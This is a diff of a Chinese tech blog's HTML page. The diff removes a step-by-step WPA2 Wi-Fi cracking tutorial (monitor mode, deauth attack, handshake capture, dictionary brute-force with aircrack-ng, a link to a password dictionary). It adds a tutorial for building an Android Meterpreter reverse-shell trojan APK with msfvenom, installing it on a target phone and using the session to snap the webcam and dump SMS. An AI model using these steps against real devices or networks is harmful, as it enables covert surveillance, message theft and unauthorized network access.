@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="kali Linux及mac os 破解WiFi, codervibe@blog">
+    <meta name="keywords" content="kali linux 控制安卓手机, codervibe@blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>kali Linux及mac os 破解WiFi | codervibe@blog</title>
+    <title>kali linux 控制安卓手机 | codervibe@blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -327,12 +327,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">kali Linux及mac os 破解WiFi</h1>
+                    <h1 class="description center-align post-title">kali linux 控制安卓手机</h1>
                 </div>
             </div>
         </div>
@@ -488,14 +488,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.8k
+                    422
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    1 分
                 </div>
                 
 
@@ -510,202 +510,29 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="kali-Linux及mac-os-破解WiFi"><a href="#kali-Linux及mac-os-破解WiFi" class="headerlink" title="kali Linux及mac os 破解WiFi"></a>kali Linux及mac os 破解WiFi</h1><p>##wpa-dictionary<br>用于 Wi-Fi 密码破解。</p>
-<h3 id="Linux-篇（推荐）"><a href="#Linux-篇（推荐）" class="headerlink" title="Linux 篇（推荐）"></a>Linux 篇（推荐）</h3><ul>
-<li>准备 一个可以开启监听模式的无线网卡 笔者使用的是一个360WiFi的网卡 某宝只要几百块</li>
-</ul>
-<h3 id="1-安装-aircrack-ng"><a href="#1-安装-aircrack-ng" class="headerlink" title="1. 安装 aircrack-ng"></a>1. 安装 aircrack-ng</h3><ul>
-<li>使用相应包管理工具安装，例如 Debian/Ubuntu 使用 apt 安装：</li>
-</ul>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo apt install aircrack-ng<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
+<li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
+<li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
+<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
+<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
+<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
+set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
+set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
+app_list # 安装的软件列表
+webcam_snap # 打开摄像头并拍照
+dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="2-查看可用的无线网卡"><a href="#2-查看可用的无线网卡" class="headerlink" title="2. 查看可用的无线网卡"></a>2. 查看可用的无线网卡</h3><p>使用命令：<code>airmon-ng</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~/workspace$ sudo airmon-ng
-
-PHY	Interface	Driver		Chipset
-
-phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>根据以上输出，可用的无线网卡为 <code>wlp8s0</code>。</p>
-<h3 id="3-指定无线网卡开启监听模式。"><a href="#3-指定无线网卡开启监听模式。" class="headerlink" title="3. 指定无线网卡开启监听模式。"></a>3. 指定无线网卡开启监听模式。</h3><p>使用命令：<code>airmon-ng start &lt;网卡名称&gt;</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0
-
-PHY	Interface	Driver		Chipset
-
-phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
-
-		(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)
-		(mac80211 station mode vif disabled for [phy0]wlp8s0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>根据以上输出，已经把 wlp8s0 这块无线网卡开启监听模式，开启后名字是 <code>wlp8s0mon</code>。</p>
-<p>开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。</p>
-<h3 id="4-扫描附近的无线网络"><a href="#4-扫描附近的无线网络" class="headerlink" title="4. 扫描附近的无线网络"></a>4. 扫描附近的无线网络</h3><p>使用命令：<code>airodump-ng &lt;处于监听模式的网卡名称&gt;</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon
-
- CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              
-
- BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
- 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    
-
- BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
-
- 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这一步会输出两个列表，两个列表不停在刷新。</p>
-<p>第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：</p>
-<ul>
-<li>BSSID: 无线 AP 的硬件地址</li>
-<li>PWR: 信号强度，值是负数，绝对值越小表示信号越强</li>
-<li>CH: 无线网络信道</li>
-<li>ENC: 加密方式，我们要破解的是 WPA2</li>
-<li>ESSID: 无线网络的名称</li>
-</ul>
-<p>第二个列表表示某个无线网络中和用户设备的连接信息：</p>
-<ul>
-<li>BSSID: 无线 AP 的硬件地址</li>
-<li>STATION: 用户设备的硬件地址</li>
-</ul>
-<p>扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。</p>
-<p>这里仅仅是演示，所以列表只保留了一条结果。</p>
-<h3 id="5-使用参数过滤扫描列表，确定扫描目标"><a href="#5-使用参数过滤扫描列表，确定扫描目标" class="headerlink" title="5. 使用参数过滤扫描列表，确定扫描目标"></a>5. 使用参数过滤扫描列表，确定扫描目标</h3><p>使用命令：<code>airodump-ng -w &lt;扫描结果保存的文件名&gt; -c &lt;无线网络信道&gt; --bssid &lt;目标无线 AP 的硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon
-
-
- CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0
-
- BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-
- 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP
-
- BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
-
- 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>刚扫描时看到输出的扫描状态是这样的：<code>CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49</code>。</p>
-<p>只有当扫描状态后面出现 <code> ][ WPA handshake: 22:47:DA:62:2A:F0</code> 后，我们才拿到拿到进行破解的握手包。</p>
-<p>扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。</p>
-<p>所以我们可以同时使用 <code>aireplay-ng</code> 对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。</p>
-<p>拿到握手包后按 Ctrl-C 结束扫描即可。</p>
-<h3 id="6-使用-aireplay-ng-对目标设备发起攻击"><a href="#6-使用-aireplay-ng-对目标设备发起攻击" class="headerlink" title="6. 使用 aireplay-ng 对目标设备发起攻击"></a>6. 使用 aireplay-ng 对目标设备发起攻击</h3><p>使用命令：<code>aireplay-ng -&lt;攻击模式&gt; &lt;攻击次数&gt; -a 无线 AP 硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
-18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
-18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]
-18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]
-18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]
-...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>发起攻击后，当 <code>airodump-ng</code> 成功拿到了握手包，使用 Ctrl-C 退出攻击。</p>
-<h3 id="7-使用-aircrack-ng-暴力破解-Wi-Fi-密码"><a href="#7-使用-aircrack-ng-暴力破解-Wi-Fi-密码" class="headerlink" title="7. 使用 aircrack-ng 暴力破解 Wi-Fi 密码"></a>7. 使用 aircrack-ng 暴力破解 Wi-Fi 密码</h3><p>使用命令：<code>aircrack-ng -w 密码字典 &lt;包含握手包的 cap 文件&gt;</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
-Opening android-01.cap
-Read 675 packets.
-
-   #  BSSID              ESSID                     Encryption
-
-   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)
-
-Choosing first network as target.
-
-Opening android-01.cap
-Reading packets, please wait...
-
-                                 Aircrack-ng 1.2 rc4
-
-      [00:00:00] 12/2492 keys tested (828.33 k/s) 
-
-      Time left: 2 seconds                                       0.48%
-
-                          KEY FOUND! [ 1234567890 ]
-
-
-      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D 
-                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 
-
-      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED 
-                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 
-                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 
-                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A 
-
-      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>根据以上输出，我们已经破解成功！Wi-Fi 密码是：<code>1234567890</code></p>
-<ul>
-<li>无线密码字典<br>  某盘<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1y4sqPPLxf6taDQdWrVN9yw">破解地址链接</a><br>  链接永久有效<br>  提取码：l6pa  <blockquote>
-<p>或者扫下面二维码  </p>
-<pre><code>  ![二维码](./img/5A2F2B534FB57D971B05851435312512.png)</code></pre>
-</blockquote>
-<h3 id="8-无线网卡退出监听模式"><a href="#8-无线网卡退出监听模式" class="headerlink" title="8. 无线网卡退出监听模式"></a>8. 无线网卡退出监听模式</h3></li>
-</ul>
-<p>使用命令：<code>airmon-ng stop &lt;处于监听模式的无限网卡名称&gt;</code></p>
-<pre class="line-numbers language-none"><code class="language-none">netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon
-
-PHY	Interface	Driver		Chipset
-
-phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
-
-		(mac80211 station mode vif enabled on [phy0]wlp8s0)
-
-		(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="MAC-OS-篇"><a href="#MAC-OS-篇" class="headerlink" title="MAC OS 篇"></a>MAC OS 篇</h2><h3 id="1-查看网卡名称"><a href="#1-查看网卡名称" class="headerlink" title="1. 查看网卡名称"></a>1. 查看网卡名称</h3><p>在终端中执行 <code>ifconfig</code> 即可查看，通常是 en0</p>
-<h3 id="2-使用-airport-监听无线网络"><a href="#2-使用-airport-监听无线网络" class="headerlink" title="2. 使用 airport 监听无线网络"></a>2. 使用 airport 监听无线网络</h3><p>由于某些原因，airmon-ng 无法在 MAC OS 使用，所以只能使用 airport 进行扫描和抓包了，但是并不好用，所以还是使用 linux 吧尽量…</p>
-<p>开始扫描，终端中执行：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>扫描结果会是这样的：</p>
-<table>
-<thead>
-<tr>
-<th>SSID</th>
-<th>BSSID</th>
-<th>RSSI</th>
-<th>CHANNEL</th>
-<th>HT</th>
-<th>CC</th>
-<th>SECURITY (auth/unicast/group)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>小米手机</td>
-<td>22:47:da:62:2a:f0</td>
-<td>-29</td>
-<td>6</td>
-<td>Y</td>
-<td>–</td>
-<td>WPA2(PSK/AES/AES)</td>
-</tr>
-</tbody></table>
-<ul>
-<li>SSID 表示 Wi-Fi 名称</li>
-<li>BSSID 表示 Wi-Fi 设备的硬件地址</li>
-<li>RSSI 表示信号强度，值是负数，绝对值越小信号越强</li>
-<li>CHANNEL 表示 Wi-Fi 信道</li>
-<li>HT 表示吞吐量模式，一般都为 Y</li>
-<li>CC 表示国家，中国为 CN</li>
-<li>SECURITY 表示加密方式</li>
-</ul>
-<h3 id="3-使用-airport-进行抓包"><a href="#3-使用-airport-进行抓包" class="headerlink" title="3. 使用 airport 进行抓包"></a>3. 使用 airport 进行抓包</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>抓一段儿事件之后，使用 Ctrl + C 停止抓包，完成后会生成一个 cap 包，看到如下提示：</p>
-<pre class="line-numbers language-none"><code class="language-none">Session saved to /tmp/airportSniff0RjCAO.cap.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="4-安装-aircrack-ng"><a href="#4-安装-aircrack-ng" class="headerlink" title="4. 安装 aircrack-ng"></a>4. 安装 <a target="_blank" rel="noopener" href="https://aircrack-ng.org/">aircrack-ng</a></h3><ul>
-<li>使用 <a target="_blank" rel="noopener" href="https://brew.sh/">Homebrew</a> 安装：</li>
-</ul>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">brew install aircrack-ng<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="5-使用-aircrack-ng-执行破解"><a href="#5-使用-aircrack-ng-执行破解" class="headerlink" title="5. 使用 aircrack-ng 执行破解"></a>5. 使用 aircrack-ng 执行破解</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
-<li><p><a target="_blank" rel="noopener" href="https://aircrack-ng.org/downloads.html">下载 Aircrack-ng</a> 提供了 Windows 的二进制包</p>
-</li>
-<li><p>使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/about">WSL</a></p>
 </li>
 </ul>
-<h3 id="更多安装方式参考：安装-Aircrack-ng"><a href="#更多安装方式参考：安装-Aircrack-ng" class="headerlink" title="更多安装方式参考：安装 Aircrack-ng"></a>更多安装方式参考：<a target="_blank" rel="noopener" href="https://aircrack-ng.org/install.html">安装 Aircrack-ng</a></h3><h1 id="谨以此片，祭奠逝去的青春！"><a href="#谨以此片，祭奠逝去的青春！" class="headerlink" title="谨以此片，祭奠逝去的青春！"></a>谨以此片，祭奠逝去的青春！</h1><h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
+<h2 id="博客持续更新中……"><a href="#博客持续更新中……" class="headerlink" title="博客持续更新中……."></a>博客持续更新中…….</h2><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -748,7 +575,7 @@ phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://codervibe.fun/2020/08/26/kali%20Linux%E5%8F%8Amac%20os%20%E7%A0%B4%E8%A7%A3WiFi/">https://codervibe.fun/2020/08/26/kali%20Linux%E5%8F%8Amac%20os%20%E7%A0%B4%E8%A7%A3WiFi/</a>
+                    <a href="https://codervibe.fun/archives/396f2685.html">https://codervibe.fun/archives/396f2685.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1005,34 +832,32 @@ phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/08/26/Ncork%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
+                <a href="/archives/3eedb17f.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Ncork内网穿透">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="整合Spring+SpringMVC+Mybatis框架">
                         
-                        <span class="card-title">Ncork内网穿透</span>
+                        <span class="card-title">整合Spring+SpringMVC+Mybatis框架</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Ncork内网穿透什么是内网穿透？内网穿透是一个什么样的效果？
-内网穿透(Intranet penetration)  
-
-下面是某度的介绍内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据
+                            整合Spring+SpringMVC+Mybatis框架导语 主要是整合三大框架 简称 SSM
+配置 使用maven 来管理jar包和插件 项目启动使用 Tomcat 插件启动 Tomcat 端口号 8080 数据库使用Mysql 端口号 
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-31
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/windows/" class="post-category">
-                                    windows
+                            <a href="/categories/javaweb%E6%A1%86%E6%9E%B6/" class="post-category">
+                                    javaweb框架
                                 </a>
                             
                             
@@ -1042,8 +867,12 @@ phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/Github/">
+                        <span class="chip bg-color">Github</span>
+                    </a>
+                    
+                    <a href="/tags/javaweb%E6%A1%86%E6%9E%B6/">
+                        <span class="chip bg-color">javaweb框架</span>
                     </a>
                     
                 </div>
@@ -1054,26 +883,24 @@ phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/26/kali%20Linux%E5%8F%8Amac%20os%20%E7%A0%B4%E8%A7%A3WiFi/">
+                <a href="/archives/b4c1f80b.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="kali Linux及mac os 破解WiFi">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="获取路由器（光猫）管理员权限">
                         
-                        <span class="card-title">kali Linux及mac os 破解WiFi</span>
+                        <span class="card-title">获取路由器（光猫）管理员权限</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            kali Linux及mac os 破解WiFi##wpa-dictionary用于 Wi-Fi 密码破解。
-Linux 篇（推荐）
-准备 一个可以开启监听模式的无线网卡 笔者使用的是一个360WiFi的网卡 某宝只要几百块
+                            获取路由器（光猫）管理员权限文章参考自 https://www.cnblogs.com/784040932/p/5922735.html我家的光猫图片
 
-1. 安装 
+1.用光猫背后的useradmin 帐号和密码登录 http://192.168.1.
                         
                     </div>
                     <div class="publish-info">
@@ -1084,20 +911,23 @@ Linux 篇（推荐）
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Linux/" class="post-category">
-                                    Linux
+                            <a href="/categories/%E5%85%B6%E4%BB%96%E6%8A%80%E6%9C%AF/" class="post-category">
+                                    其他技术
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/kali-linux/">
-                        <span class="chip bg-color">kali linux</span>
+                    <a href="/tags/%E6%97%A5%E5%B8%B8/">
+                        <span class="chip bg-color">日常</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%A0%B4%E8%A7%A3/">
+                        <span class="chip bg-color">破解</span>
                     </a>
                     
                 </div>
